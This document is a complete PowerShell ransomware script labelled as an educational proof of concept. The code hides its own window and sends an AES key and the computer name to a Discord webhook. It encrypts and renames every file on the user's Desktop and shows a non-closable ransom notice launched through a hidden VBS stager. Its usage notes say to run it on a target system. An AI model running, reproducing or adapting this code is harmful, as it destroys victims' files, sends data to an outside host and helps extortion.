<#=================================================== Beigeworm's File Encryptor =======================================================

SYNOPSIS
This script encrypts all files within selected folders, posts the encryption key to a Discord webhook, and starts a non closable window
with a notice to the user.
By default this script encrypts all user data in Documents and Desktop folders.

**WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**

THIS IS EFFECTIVELY RANSOMWARE - I CANNOT TAKE RESPONSIBILITY FOR LOST FILES!
DO NOT USE THIS ON ANY CRITICAL SYSTEMS OR SYSTEMS WITHOUT PERMISSION
THIS IS A PROOF OF CONCEPT TO WRITE RANSOMWARE IN POWERSHELL AND IS FOR EDUCATIONAL PURPOSES

**WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   

USAGE
1. Enter your webhook below. (if not pre-defined in a stager file or duckyscript etc)
2. Run the script on target system.
3. Check Discord for the Decryption Key.
4. Use the decryptor to decrypt the files.

CREDIT
Credit and kudos to InfosecREDD for the idea of writing ransomware in Powershell
this is my interpretation of his non publicly available script used in this Talking Sasquatch video.
https://youtu.be/IwfoHN2dWeE

#>

# Uncomment below if not using a stager (base64 script, flipper etc)
# $dc = 'YOUR_WEBHOOK_HERE'

# HIDE THE WINDOW - Change to 1 to hide the console window
$HideWindow = 1

If ($HideWindow -gt 0){
$Import = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
add-type -name win -member $Import -namespace native;
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);
}
# ENCRYPT FILE CONTENTS
# Define setup variables
$whuri = "$dc"
if ($whuri.Ln -ne 121){Write-host "Shortened Webhook URL Detected"; $whuri = (irm $whuri).url}
$SourceFolder = "$env:USERPROFILE\Desktop" #,"$env:USERPROFILE\Documents","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive"
$files = Get-ChildItem -Path $SourceFolder -File -Recurse

# Generate the indcator file (for pop-up close detection and to avoid double encryption)
$indicator = "$env:tmp/indicate"
if (!(Test-Path -Path $indicator)){
"indicate" | Out-File -FilePath $indicator -Append
}else{
exit
}

# Encryption setup
$CustomIV = 'r7SbTffTMbMA4Zm70iHAwA=='
$Key = [System.Security.Cryptography.Aes]::Create()
$Key.GenerateKey()
$IVBytes = [System.Convert]::FromBase64String($CustomIV)
$Key.IV = $IVBytes
$KeyBytes = $Key.Key
$KeyString = [System.Convert]::ToBase64String($KeyBytes)

# Save key to a local temp file (FAILSAFE)
"Decryption Key: $KeyString" | Out-File -FilePath $env:tmp/key.log -Append

# Define the body of the message and convert it to JSON
$body = @{"username" = "$env:COMPUTERNAME" ;"content" = "Decryption Key: $KeyString"} | ConvertTo-Json

# Use 'Invoke-RestMethod' command to send the message to Discord
IRM -Uri $whuri -Method Post -ContentType "application/json" -Body $body

# Encrypt each file in the source folder (recursive)
Get-ChildItem -Path $SourceFolder -File -Recurse | ForEach-Object {
    $File = $_
    $Encryptor = $Key.CreateEncryptor()
    $Content = [System.IO.File]::ReadAllBytes($File.FullName)
    $EncryptedContent = $Encryptor.TransformFinalBlock($Content, 0, $Content.Length)
    [System.IO.File]::WriteAllBytes($File.FullName, $EncryptedContent)
}

# CHANGE FILE EXTENTIONS
# Loop through each file and rename it
foreach ($file in $files) {
    $newName = $file.Name + ".enc"
    $newPath = Join-Path -Path $SourceFolder -ChildPath $newName
    Rename-Item -Path $file.FullName -NewName $newName
}

# POP-UP / RANSOM NOTE
# Define code for the pop-up
$ToFile = @'
Add-Type -AssemblyName System.Windows.Forms
$fullName = (Get-WmiObject Win32_UserAccount -Filter "Name = '$Env:UserName'").FullName
$form = New-Object Windows.Forms.Form
$form.Text = "  **YOUR FILES HAVE BEEN ENCRYPTED!**"
$form.Font = 'Microsoft Sans Serif,12,style=Bold'
$form.Size = New-Object Drawing.Size(800, 600)
$form.StartPosition = 'CenterScreen'
$form.BackColor = [System.Drawing.Color]::Black
$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
$form.ControlBox = $false
$form.TopMost = $true
$form.Font = 'Microsoft Sans Serif,12,style=bold'
$form.ForeColor = "#FF0000"

$title = New-Object Windows.Forms.Label
$title.Text = " _____`n / '''   ''' \ `n|' '() ()' '| `n \''  ^  ''/ `n   ||||||||  `n   ||||||||"
$title.Font = 'Microsoft Sans Serif,14'
$title.AutoSize = $true
$title.Location = New-Object System.Drawing.Point(330, 20)

$label = New-Object Windows.Forms.Label
if ($fullName.Length -ne 0){
    $label.Text = "Hello $fullName! Your Files Have Been ENCRYPTED."
}else{
    $label.Text = "Hello User! Your Files Have Been ENCRYPTED."
}
$label.Font = 'Microsoft Sans Serif,18,style=Underline,bold'
$label.AutoSize = $true
$label.Location = New-Object System.Drawing.Point(60, 200)

$label2 = New-Object Windows.Forms.Label
$label2.Text = " To recover your files you will need the Decryption Key `n`n`n Run the Decryptor script and enter the key to recover files `n`n`n You can close this window when Decryption is complete `n`n`n Written by @beigeworm - Follow on Github - Discord : egieb"
$label2.AutoSize = $true
$label2.Location = New-Object System.Drawing.Point(60, 280)

$button = New-Object Windows.Forms.Button
$button.Text = "Close"
$button.Width = 120
$button.Height = 35
$button.BackColor = [System.Drawing.Color]::White
$button.ForeColor = [System.Drawing.Color]::Black
$button.DialogResult = [System.Windows.Forms.DialogResult]::OK
$button.Location = New-Object System.Drawing.Point(660, 520)
$button.Font = 'Microsoft Sans Serif,12,style=Bold'

$form.Controls.AddRange(@($title,$label,$label2,$button))

$result = $form.ShowDialog()
While (Test-Path -Path $env:tmp/indicate){if($result -eq [System.Windows.Forms.DialogResult]::OK){$form.ShowDialog()}}
'@

# Define VBS code for popup initialization
$ToVbs = @'
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%temp%\win.ps1""", 0, True
'@

# Save pop-up code to file
$ToFile | Out-File -FilePath $env:tmp/win.ps1 -Append

# Save pop-up initialization code to file
$VbsPath = "$env:tmp\service.vbs"
$ToVbs | Out-File -FilePath $VbsPath -Force

# START POP-UP AND CLEAN UP
# Start pop-up window
& $VbsPath

# Remove files 
sleep 1
rm -Path $VbsPath -Force
rm -Path "$env:tmp\win.ps1" -Force
